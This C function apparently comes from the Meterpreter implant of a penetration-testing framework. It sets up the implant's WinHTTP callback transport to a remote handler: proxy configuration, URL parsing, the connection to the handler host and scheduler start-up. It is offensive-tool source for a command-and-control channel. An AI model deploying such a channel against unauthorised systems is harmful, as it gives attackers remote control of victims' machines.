BOOL server_init_http_winhttp(Remote* remote, SOCKET fd)
{
	URL_COMPONENTS bits;
	wchar_t tmpHostName[512];
	wchar_t tmpUrlPath[1024];
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	dprintf("[WINHTTP] Initialising ...");

	// configure proxy
	if (ctx->proxy && wcscmp(ctx->proxy, L"METERPRETER_PROXY") != 0)
	{
		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
	}
	else
	{
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	}

	if (!ctx->internet)
	{
		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
		return FALSE;
	}

	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);

	// The InternetCrackUrl method was poorly designed...
	ZeroMemory(tmpHostName, sizeof(tmpHostName));
	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));

	ZeroMemory(&bits, sizeof(bits));
	bits.dwStructSize = sizeof(bits);

	bits.dwHostNameLength = HOSTNAME_LEN - 1;
	bits.lpszHostName = tmpHostName;

	bits.dwUrlPathLength = URLPATH_LEN - 1;
	bits.lpszUrlPath = tmpUrlPath;

	dprintf("[DISPATCH] About to crack URL: %S", remote->transport->url);
	WinHttpCrackUrl(remote->transport->url, 0, 0, &bits);

	ctx->uri = _wcsdup(tmpUrlPath);

	dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	ctx->connection = WinHttpConnect(ctx->internet, tmpHostName, bits.nPort, 0);
	if (!ctx->connection)
	{
		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
		return FALSE;
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);

	// Bring up the scheduler subsystem.
	return scheduler_initialize(remote) == ERROR_SUCCESS;
}